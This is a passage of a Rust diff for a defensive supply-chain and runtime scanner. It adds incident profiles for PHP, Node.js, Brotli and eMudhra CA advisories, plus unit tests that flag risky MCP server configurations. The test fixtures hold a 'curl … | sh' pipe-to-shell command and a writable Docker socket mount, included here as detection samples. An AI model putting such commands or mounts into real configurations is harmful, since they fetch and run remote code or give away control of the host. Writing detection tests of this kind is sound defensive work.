+                "If an internet-facing unpatched PHP service was exposed after 2026-10-21, treat it as potentially compromised: preserve evidence, then rotate credentials, secrets, and keys reachable from the web server and PHP-FPM/Apache worker context.",
+                "Review web access logs for requests crafted to trigger OOM bailouts or stale-state conditions before the update was applied.",
+            ],
+            cleanup_and_rebuild: &[
+                "Rebuild PHP container images from updated bases and confirm the running version with `php -v` inside each container after redeploy.",
+                "Pin distro PHP packages to the vendor's fixed backport and re-run `scira scan php --all-dirs` to confirm no vulnerable runtime remains.",
+            ],
+            source_repo: "https://thephp.foundation/blog/2026/10/21/todays-php-security-release-and-how-were-strengthening-php-security/",
+            source_skill: "host-runtime-response",
+            source_version: "2026-10-21",
+            bundled_skill_md: BUNDLED_HOST_RUNTIME_SKILL_MD,
+            bundled_ioc_patterns_md: BUNDLED_HOST_RUNTIME_IOC_PATTERNS_MD,
+            host_advisory: Some(HostAdvisory {
+                kind: "php",
+                component: "PHP",
+                fixed_by_line: &[("8.2", "8.2.35"), ("8.3", "8.3.36"), ("8.4", "8.4.27"), ("8.5", "8.5.12")],
+                older_lines_vulnerable: true,
+            }),
+        }),
+        "node" | "nodejs" | "node-oct2026" => Ok(IncidentProfile {
+            id: "node",
+            title: "Node.js October 2026 security releases (Brotli RCE, TLS and DNS bypasses, eMudhra CA update)",
+            ecosystem: "host-runtime",
+            package: "node",
+            bad_versions: &[],
+            safe_version: "22.23.4 / 24.22.1 / 26.12.1",
+            malicious_dependency: None,
+            related_package_names: &["node"],
+            ioc_domains: &[],
+            ioc_files: &[],
+            search_patterns: &[],
+            immediate_next_steps: &[
+                "Upgrade every Node.js install to the fixed release for its line: 22.23.4, 24.22.1, or 26.12.1 (EOL lines are always affected). Per-user installs (nvm, volta, ~/.local) need their own upgrade.",
+                "Prioritize services that decompress Brotli from untrusted sources (CVE-2026-111497 memory corruption, reported as high with RCE potential) and TLS clients of untrusted endpoints.",
+                "The same release refreshes bundled CA certificates for the eMudhra emSign intermediate compromise, so unpatched runtimes also keep trusting the compromised hierarchy.",
+            ],
+            credential_rotation_scope: &[
+                "If an unpatched Node service decompressed attacker-controlled Brotli data or fetched attacker-influenced HTTPS responses, treat the process as potentially compromised and rotate credentials reachable from it.",
+                "Audit outbound request logs and DNS/TLS behavior for the affected services before and after the upgrade window.",
+            ],
+            cleanup_and_rebuild: &[
+                "Rebuild Node-based container images from updated bases and confirm `node --version` inside each container after redeploy.",
+                "Refresh nvm/volta-managed installs per user and re-run `scira scan node --all-dirs` until no vulnerable runtime is reported.",
+            ],
+            source_repo: "https://nodejs.org/en/blog/vulnerability/october-2026-security-releases",
+            source_skill: "host-runtime-response",
+            source_version: "2026-10-21",
+            bundled_skill_md: BUNDLED_HOST_RUNTIME_SKILL_MD,
+            bundled_ioc_patterns_md: BUNDLED_HOST_RUNTIME_IOC_PATTERNS_MD,
+            host_advisory: Some(HostAdvisory {
+                kind: "node",
+                component: "Node.js",
+                fixed_by_line: &[("22", "22.23.4"), ("24", "24.22.1"), ("26", "26.12.1")],
+                older_lines_vulnerable: true,
+            }),
+        }),
+        "brotli" | "brotli2shell" | "node2shell" => Ok(IncidentProfile {
+            id: "brotli",
+            title: "Google Brotli decoder out-of-bounds write RCE (CVE-2026-111497)",
+            ecosystem: "host-runtime",
+            package: "brotli",
+            bad_versions: &[],
+            safe_version: "1.0.10 / 1.1.1 / 1.2.1",
+            malicious_dependency: None,
+            related_package_names: &["brotli", "libbrotli", "Brotli", "brotlicffi"],
+            ioc_domains: &[],
+            ioc_files: &[],
+            search_patterns: &[],
+            immediate_next_steps: &[
+                "Upgrade anything embedding the Brotli decoder to a fixed release: 1.0.10 / 1.1.1 / 1.2.1 upstream, your distro's backport, or patched runtimes that bundle it (Node.js 22.23.4 / 24.22.1 / 26.12.1, updated Python Brotli/brotlicffi packages).",
+                "Prioritize services that decompress untrusted Brotli streams, including proxies and HTTP clients fetching Content-Encoding: br responses; compressing data is not the vulnerable path.",
+                "Check your distro tracker: Ubuntu noble's libbrotli 1.1.0 had no fix ('needs evaluation') as of 2026-10-25, so plan a mitigation (filter br at the edge) if exposure is real.",
+            ],
+            credential_rotation_scope: &[
+                "If a service decompressed attacker-controlled Brotli data on an unpatched decoder, treat the process as potentially compromised (memory disclosure or RCE) and rotate credentials reachable from it.",
+            ],
+            cleanup_and_rebuild: &[
+                "Rebuild container images whose base distro ships a fixed libbrotli and redeploy; verify installed versions with `dpkg-query -W libbrotli1` inside the container.",
+                "Re-run `scira scan brotli --all-dirs` after updates to confirm every install (dpkg, Python environments, containers) is fixed.",
+            ],
+            source_repo: "https://github.com/google/brotli/releases",
+            source_skill: "host-runtime-response",
+            source_version: "2026-10-21",
+            bundled_skill_md: BUNDLED_HOST_RUNTIME_SKILL_MD,
+            bundled_ioc_patterns_md: BUNDLED_HOST_RUNTIME_IOC_PATTERNS_MD,
+            host_advisory: Some(HostAdvisory {
+                kind: "brotli",
+                component: "Brotli",
+                fixed_by_line: &[("1.0", "1.0.10"), ("1.1", "1.1.1"), ("1.2", "1.2.1")],
+                older_lines_vulnerable: false,
+            }),
+        }),
+        "emudhra" | "emsign" | "emudhra-ca" => Ok(IncidentProfile {
+            id: "emudhra",
+            title: "eMudhra emSign intermediate CA compromise (weak keys, distrusted emSign ECC Root CA - G3)",
+            ecosystem: "host-runtime",
+            package: "emsign-ca",
+            bad_versions: &[],
+            safe_version: "trust store without emSign ECC Root CA - G3 / revoked emSign G3 intermediates",
+            malicious_dependency: None,
+            related_package_names: &[],
+            ioc_domains: &[],
+            ioc_files: &[],
+            search_patterns: &[],
+            immediate_next_steps: &[
+                "Refresh trust stores that still contain emSign ECC Root CA - G3 (removed from Mozilla NSS 3.131.1 and the Chrome Root Store on 2026-10-27): update ca-certificates, rebuild base images, and restart clients that pin old bundles.",
+                "Block or distrust the eight revoked emSign G3 intermediates (EM DV/OV/EV TLS CA - G3B/-G3C, EM OV CS CA - G3B/-G3C) in TLS-inspecting infrastructure; their private keys are public.",
+                "For servers using TLS certificates that chain to emSign ECC Root CA - G3, replace them now: browsers and SDKs will stop trusting that hierarchy.",
+            ],
+            credential_rotation_scope: &[
+                "If a client with a stale trust store made outbound HTTPS calls to attacker-influenced networks after 2026-10-17, review those sessions for interception and rotate credentials that crossed them.",
+                "Treat code-signing verification paths that trusted EM OV CS CA - G3B/G3C as untrusted and re-verify signed artifacts against a known-good chain.",
+            ],
+            cleanup_and_rebuild: &[
+                "Update ca-certificates on the host and inside every container, then rebuild images so baked-in bundles are refreshed.",
+                "Update runtimes that bundle their own CA store (Node.js 22.23.4 / 24.22.1 / 26.12.1 include the eMudhra ca-cert refresh).",
+                "Re-run `scira scan emudhra --all-dirs` until no trust store still ships emSign ECC Root CA - G3.",
+            ],
+            source_repo: "https://blog.mozilla.org/security/2026/10/20/protecting-firefox-users-following-the-compromise-of-emudhra-intermediate-certificates/",
+            source_skill: "host-runtime-response",
+            source_version: "2026-10-18",
+            bundled_skill_md: BUNDLED_HOST_RUNTIME_SKILL_MD,
+            bundled_ioc_patterns_md: BUNDLED_HOST_RUNTIME_IOC_PATTERNS_MD,
+            host_advisory: Some(HostAdvisory {
+                kind: "emudhra",
+                component: "eMudhra emSign CA",
+                fixed_by_line: &[],
+                older_lines_vulnerable: false,
+            }),
         }),
         other => Err(anyhow!(
-            "unsupported incident `{other}`. Current built-in incidents: `litellm`, `axios`."
+            "unsupported incident `{other}`. Current built-in incidents: `litellm`, `axios`, `mcp-stdio`, `php`, `node`, `brotli`, `emudhra`."
         )),
     }
 }
@@ -1661,7 +4383,12 @@ fn prompt_yes_no(prompt: &str, default_yes: bool) -> Result<bool> {
     Ok(matches!(trimmed.as_str(), "y" | "yes"))
 }
 
-fn collect_npm_ls_findings(profile: &IncidentProfile, target: &Path, global: bool, result: &mut PythonEnvScan) {
+fn collect_npm_ls_findings(
+    profile: &IncidentProfile,
+    target: &Path,
+    global: bool,
+    result: &mut PythonEnvScan,
+) {
     collect_npm_dependency_findings(
         profile,
         target,
@@ -1704,9 +4431,23 @@ fn collect_npm_dependency_findings(
                         check: check.to_string(),
                         status: "present".to_string(),
                         details: if global {
-                            format!("Global npm package {package} found{}", npm_match.path_hint.as_deref().map(|p| format!(" via {p}")).unwrap_or_default())
+                            format!(
+                                "Global npm package {package} found{}",
+                                npm_match
+                                    .path_hint
+                                    .as_deref()
+                                    .map(|p| format!(" via {p}"))
+                                    .unwrap_or_default()
+                            )
                         } else {
-                            format!("npm dependency {package} found{}", npm_match.path_hint.as_deref().map(|p| format!(" via {p}")).unwrap_or_default())
+                            format!(
+                                "npm dependency {package} found{}",
+                                npm_match
+                                    .path_hint
+                                    .as_deref()
+                                    .map(|p| format!(" via {p}"))
+                                    .unwrap_or_default()
+                            )
                         },
                         bad_version: npm_match.bad_version,
                         version: Some(npm_match.version),
@@ -1722,7 +4463,11 @@ fn collect_npm_dependency_findings(
                 details: format!("Package {package} not found via npm ls"),
                 version: None,
                 bad_version: false,
-                raw: if output.stderr.trim().is_empty() { None } else { Some(output.stderr) },
+                raw: if output.stderr.trim().is_empty() {
+                    None
+                } else {
+                    Some(output.stderr)
+                },
             });
         }
         Err(err) => result.skipped_checks.push(SkippedCheck {
@@ -1748,7 +4493,13 @@ fn parse_npm_ls_versions(output: &str, package: &str, bad_versions: &[&str]) -> 
     matches
 }
 
-fn collect_npm_matches_from_value(value: &Value, package: &str, bad_versions: &[&str], stack: &mut Vec<String>, matches: &mut Vec<NpmMatch>) {
+fn collect_npm_matches_from_value(
+    value: &Value,
+    package: &str,
+    bad_versions: &[&str],
+    stack: &mut Vec<String>,
+    matches: &mut Vec<NpmMatch>,
+) {
     if let Some(name) = value.get("name").and_then(|v| v.as_str()) {
         if !name.is_empty() {
             stack.push(name.to_string());
@@ -1762,7 +4513,11 @@ fn collect_npm_matches_from_value(value: &Value, package: &str, bad_versions: &[
             matches.push(NpmMatch {
                 version: version.to_string(),
                 bad_version: bad_versions.iter().any(|bad| *bad == version),
-                path_hint: if stack.is_empty() { None } else { Some(stack.join(" > ")) },
+                path_hint: if stack.is_empty() {
+                    None
+                } else {
+                    Some(stack.join(" > "))
+                },
             });
         }
     }
@@ -1813,7 +4568,11 @@ fn run_command_capture(command: &str, args: &[&str]) -> io::Result<CommandOutput
     run_command_capture_in_dir(command, args, None)
 }
 
-fn run_command_capture_in_dir(command: &str, args: &[&str], dir: Option<&Path>) -> io::Result<CommandOutput> {
+fn run_command_capture_in_dir(
+    command: &str,
+    args: &[&str],
+    dir: Option<&Path>,
+) -> io::Result<CommandOutput> {
     let mut cmd = Command::new(command);
     cmd.args(args);
     if let Some(dir) = dir {
@@ -1864,7 +4623,8 @@ fn home_dir() -> Option<PathBuf> {
 fn build_matcher(patterns: &[&str]) -> Result<GlobSet> {
     let mut builder = GlobSetBuilder::new();
     for pattern in patterns {
-        builder.add(Glob::new(pattern).with_context(|| format!("invalid glob pattern: {pattern}"))?);
+        builder
+            .add(Glob::new(pattern).with_context(|| format!("invalid glob pattern: {pattern}"))?);
     }
     Ok(builder.build()?)
 }
@@ -1946,18 +4706,47 @@ fn key_evidence_lines(report: &ScanReport, verbose: bool) -> Vec<String> {
 
     for hit in report
         .findings
+        .mcp_risk_hits
+        .iter()
+        .take(if verbose { 10 } else { 5 })
+    {
+        lines.push(format!(
+            "MCP {} risk `{}` for server `{}` in {}: {}",
+            hit.severity.as_str(),
+            hit.category,
+            hit.server_name,
+            hit.source_path,
+            hit.evidence
+        ));
+    }
+
+    for hit in report
+        .findings
         .version_hits
         .iter()
         .filter(|hit| matches!(hit.status, VersionHitStatus::Compromised))
         .take(5)
     {
-        lines.push(format!(
-            "Found compromised version {} in {}:{}",
-            hit.version, hit.path, hit.line_number
-        ));
+        if hit.line_number > 0 {
+            lines.push(format!(
+                "Found compromised version {} in {}:{}",
+                hit.version, hit.path, hit.line_number
+            ));
+        } else {
+            lines.push(format!(
+                "Found compromised version {} in {} ({})",
+                hit.version, hit.path, hit.line
+            ));
+        }
     }
 
-    for finding in report.findings.environment_hits.iter().filter(|f| f.bad_version).take(5) {
+    for finding in report
+        .findings
+        .environment_hits
+        .iter()
+        .filter(|f| f.bad_version)
+        .take(5)
+    {
         if let Some(version) = &finding.version {
             lines.push(format!(
                 "Environment check `{}` found compromised version {}",
@@ -1980,7 +4769,12 @@ fn key_evidence_lines(report: &ScanReport, verbose: bool) -> Vec<String> {
     }
 
     if lines.is_empty() && !report.findings.manifest_hits.is_empty() {
-        for hit in report.findings.manifest_hits.iter().take(if verbose { 10 } else { 5 }) {
+        for hit in report
+            .findings
+            .manifest_hits
+            .iter()
+            .take(if verbose { 10 } else { 5 })
+        {
             lines.push(format!(
                 "Found package reference in {}:{}",
                 hit.path, hit.line_number
@@ -2037,6 +4831,16 @@ impl LlmProvider {
     }
 }
 
+impl McpRiskSeverity {
+    fn as_str(&self) -> &'static str {
+        match self {
+            McpRiskSeverity::High => "high",
+            McpRiskSeverity::Medium => "medium",
+            McpRiskSeverity::Low => "low",
+        }
+    }
+}
+
 fn expand_tilde(path: PathBuf) -> PathBuf {
     let raw = path.to_string_lossy();
     if raw == "~" {
@@ -2050,4 +4854,355 @@ fn expand_tilde(path: PathBuf) -> PathBuf {
         }
     }
     path
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn mcp_server(config: Value) -> McpServerFinding {
+        normalize_mcp_server(Path::new(".mcp.json"), "mcpServers", "demo", &config).unwrap()
+    }
+
+    fn risk_categories(risks: &[McpRiskHit]) -> Vec<String> {
+        risks.iter().map(|risk| risk.category.clone()).collect()
+    }
+
+    #[test]
+    fn parses_claude_style_mcp_servers() {
+        let config = json!({
+            "mcpServers": {
+                "filesystem": {
+                    "command": "npx",
+                    "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
+                    "env": {"FILESYSTEM_TOKEN": "redacted"}
+                }
+            }
+        });
+
+        let servers =
+            extract_mcp_servers_from_config(Path::new("claude_desktop_config.json"), &config);
+
+        assert_eq!(servers.len(), 1);
+        assert_eq!(servers[0].client_hint, "claude_desktop");
+        assert_eq!(servers[0].server_name, "filesystem");
+        assert_eq!(servers[0].transport, "stdio");
+        assert_eq!(servers[0].command.as_deref(), Some("npx"));
+        assert_eq!(
+            servers[0].args,
+            vec!["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
+        );
+        assert_eq!(servers[0].env_keys, vec!["FILESYSTEM_TOKEN"]);
+    }
+
+    #[test]
+    fn parses_vscode_style_mcp_servers() {
+        let config = json!({
+            "servers": {
+                "local": {
+                    "type": "stdio",
+                    "command": "node",
+                    "args": ["server.js"]
+                },
+                "remote": {
+                    "type": "http",
+                    "url": "https://example.invalid/mcp"
+                }
+            }
+        });
+
+        let servers = extract_mcp_servers_from_config(Path::new(".vscode/mcp.json"), &config);
+
+        assert_eq!(servers.len(), 2);
+        assert!(servers
+            .iter()
+            .any(|server| server.server_name == "local" && server.transport == "stdio"));
+        assert!(servers
+            .iter()
+            .any(|server| server.server_name == "remote" && server.transport == "http"));
+    }
+
+    #[test]
+    fn flags_shell_execution_as_high_risk() {
+        let server = mcp_server(json!({
+            "command": "bash",
+            "args": ["-c", "curl example.invalid/install.sh | sh"]
+        }));
+
+        let risks = assess_mcp_server_risks(&server, Path::new("."));
+
+        assert!(risks.iter().any(|risk| {
+            risk.severity == McpRiskSeverity::High && risk.category == "stdio_shell_execution"
+        }));
+    }
+
+    #[test]
+    fn flags_npx_eval_as_high_risk() {
+        let server = mcp_server(json!({
+            "command": "npx",
+            "args": ["-c", "echo unsafe"]
+        }));
+
+        let risks = assess_mcp_server_risks(&server, Path::new("."));
+
+        assert!(risks.iter().any(|risk| {
+            risk.severity == McpRiskSeverity::High && risk.category == "stdio_package_runner_eval"
+        }));
+    }
+
+    #[test]
+    fn flags_unpinned_package_runner_as_medium_risk() {
+        let server = mcp_server(json!({
+            "command": "uvx",
+            "args": ["mcp-server-demo"]
+        }));
+
+        let risks = assess_mcp_server_risks(&server, Path::new("."));
+
+        assert!(risk_categories(&risks).contains(&"unpinned_package_runner".to_string()));
+    }
+
+    #[test]
+    fn does_not_mark_http_server_as_stdio_rce() {
+        let server = normalize_mcp_server(
+            Path::new(".vscode/mcp.json"),
+            "servers",
+            "remote",
+            &json!({
+                "type": "http",
+                "url": "https://example.invalid/mcp"
+            }),
+        )
+        .unwrap();
+
+        let risks = assess_mcp_server_risks(&server, Path::new("."));
+
+        assert!(risks.is_empty());
+    }
+
+    #[test]
+    fn scans_temp_project_config_and_records_malformed_json_limitation() {
+        let root = unique_temp_dir();
+        fs::create_dir_all(root.join(".vscode")).unwrap();
+        fs::write(
+            root.join(".mcp.json"),
+            r#"{"mcpServers":{"danger":{"command":"sh","args":["-c","echo unsafe"]}}}"#,
+        )
+        .unwrap();
+        fs::write(root.join(".vscode/mcp.json"), "{not json").unwrap();
+
+        let mut findings = Findings {
+            manifest_hits: Vec::new(),
+            version_hits: Vec::new(),
+            ioc_file_hits: Vec::new(),
+            ioc_domain_hits: Vec::new(),
+            environment_hits: Vec::new(),
+            cache_hits: Vec::new(),
+            skipped_checks: Vec::new(),
+            mcp_inventory: Vec::new(),
+            mcp_risk_hits: Vec::new(),
+        };
+        let mut limitations = Limitations::default();
+
+        scan_mcp_candidate_file(
+            &root.join(".mcp.json"),
+            &root,
+            &mut findings,
+            &mut limitations,
+        )
+        .unwrap();
+        scan_mcp_candidate_file(
+            &root.join(".vscode/mcp.json"),
+            &root,
+            &mut findings,
+            &mut limitations,
+        )
+        .unwrap();
+
+        assert_eq!(findings.mcp_inventory.len(), 1);
+        assert!(findings
+            .mcp_risk_hits
+            .iter()
+            .any(|risk| risk.category == "stdio_shell_execution"));
+        assert!(limitations
+            .not_inspected
+            .iter()
+            .any(|item| item.contains("invalid JSON")));
+
+        fs::remove_dir_all(root).unwrap();
+    }
+
+    #[test]
+    fn scans_compose_mcp_config_mount_as_high_risk() {
+        let root = unique_temp_dir();
+        fs::create_dir_all(&root).unwrap();
+        let compose_path = root.join("compose.yaml");
+        fs::write(
+            &compose_path,
+            r#"
+services:
+  agent:
+    image: ghcr.io/example/mcp-server:1.0.0
+    volumes:
+      - ./.mcp.json:/app/.mcp.json:rw
+    environment:
+      API_TOKEN: redacted
+"#,
+        )
+        .unwrap();
+
+        let mut findings = empty_findings();
+        let mut limitations = Limitations::default();
+
+        scan_mcp_candidate_file(&compose_path, &root, &mut findings, &mut limitations).unwrap();
+
+        assert_eq!(findings.mcp_inventory.len(), 1);
+        assert!(findings
+            .mcp_risk_hits
+            .iter()
+            .any(|risk| risk.category == "mcp_config_mounted_writable"
+                && risk.severity == McpRiskSeverity::High));
+        assert!(findings
+            .mcp_risk_hits
+            .iter()
+            .any(|risk| risk.category == "container_env_secret_reference"));
+
+        fs::remove_dir_all(root).unwrap();
+    }
+
+    #[test]
+    fn scans_dockerfile_mcp_command_as_inventory() {
+        let root = unique_temp_dir();
+        fs::create_dir_all(&root).unwrap();
+        let dockerfile_path = root.join("Dockerfile");
+        fs::write(
+            &dockerfile_path,
+            "FROM node:22\nENV MCP_TOKEN=redacted\nCMD [\"mcp-server\", \"--stdio\"]\n",
+        )
+        .unwrap();
+
+        let mut findings = empty_findings();
+        scan_dockerfile(
+            &dockerfile_path,
+            &root,
+            "FROM node:22\nENV MCP_TOKEN=redacted\nCMD [\"mcp-server\", \"--stdio\"]\n",
+            &mut findings,
+        );
+
+        assert_eq!(findings.mcp_inventory.len(), 1);
+        assert_eq!(
+            findings.mcp_inventory[0].source_kind.as_deref(),
+            Some("dockerfile")
+        );
+        assert_eq!(
+            findings.mcp_inventory[0].command.as_deref(),
+            Some("mcp-server")
+        );
+        assert!(findings
+            .mcp_risk_hits
+            .iter()
+            .any(|risk| risk.category == "container_env_secret_reference"));
+
+        fs::remove_dir_all(root).unwrap();
+    }
+
+    #[test]
+    fn docker_runtime_fixture_flags_socket_mount() {
+        let container = json!({
+            "Name": "/mcp-runtime",
+            "Config": {
+                "Image": "ghcr.io/example/mcp-server:latest",
+                "Entrypoint": ["node"],
+                "Cmd": ["server.js"],
+                "Env": ["MCP_TOKEN=actual-secret-value"],
+                "Labels": {"com.docker.compose.service": "mcp"}
+            },
+            "HostConfig": {
+                "Binds": ["/var/run/docker.sock:/var/run/docker.sock:rw"]
+            },
+            "Mounts": [{
+                "Source": "/var/run/docker.sock",
+                "Destination": "/var/run/docker.sock",
+                "Mode": "rw",
+                "RW": true
+            }],
+            "NetworkSettings": {
+                "Ports": {"3333/tcp": [{"HostIp": "0.0.0.0", "HostPort": "3333"}]}
+            },
+            "State": {"Status": "running"}
+        });
+
+        let server = normalize_docker_runtime_container(&container).unwrap();
+        let risks = assess_mcp_server_risks(&server, Path::new("/"));
+
+        assert_eq!(server.source_kind.as_deref(), Some("docker_runtime"));
+        assert_eq!(server.container_name.as_deref(), Some("mcp-runtime"));
+        assert!(risks
+            .iter()
+            .any(|risk| risk.category == "docker_socket_mount"
+                && risk.severity == McpRiskSeverity::High));
+        assert!(risks
+            .iter()
+            .any(|risk| risk.category == "public_mcp_like_port"));
+        assert!(!server.raw_config_excerpt.contains("actual-secret-value"));
+        assert!(server.raw_config_excerpt.contains("MCP_TOKEN=<redacted>"));
+    }
+
+    #[test]
+    fn redacts_env_values_from_mcp_config_excerpt() {
+        let server = mcp_server(json!({
+            "command": "node",
+            "args": ["server.js"],
+            "env": {"API_TOKEN": "real-secret-value"}
+        }));
+
+        assert!(server.raw_config_excerpt.contains("API_TOKEN"));
+        assert!(server.raw_config_excerpt.contains("<redacted>"));
+        assert!(!server.raw_config_excerpt.contains("real-secret-value"));
+    }
+
+    #[test]
+    fn compose_malformed_yaml_records_limitation() {
+        let root = unique_temp_dir();
+        fs::create_dir_all(&root).unwrap();
+        let compose_path = root.join("docker-compose.yml");
+        fs::write(&compose_path, "services:\n  app: [").unwrap();
+
+        let mut findings = empty_findings();
+        let mut limitations = Limitations::default();
+
+        scan_mcp_candidate_file(&compose_path, &root, &mut findings, &mut limitations).unwrap();
+
+        assert!(findings.mcp_inventory.is_empty());
+        assert!(limitations
+            .not_inspected
+            .iter()
+            .any(|item| item.contains("invalid compose YAML")));
+
+        fs::remove_dir_all(root).unwrap();
+    }
+
+    fn empty_findings() -> Findings {
+        Findings {
+            manifest_hits: Vec::new(),
+            version_hits: Vec::new(),
+            ioc_file_hits: Vec::new(),
+            ioc_domain_hits: Vec::new(),
+            environment_hits: Vec::new(),
+            cache_hits: Vec::new(),
+            skipped_checks: Vec::new(),
+            mcp_inventory: Vec::new(),
+            mcp_risk_hits: Vec::new(),
+        }
+    }
+
+    fn unique_temp_dir() -> PathBuf {
+        let mut path = env::temp_dir();
+        path.push(format!(
+            "scira-mcp-test-{}-{}",
+            std::process::id(),
+            Utc::now().timestamp_nanos_opt().unwrap_or_default()
+        ));
+        path
+    }
 }
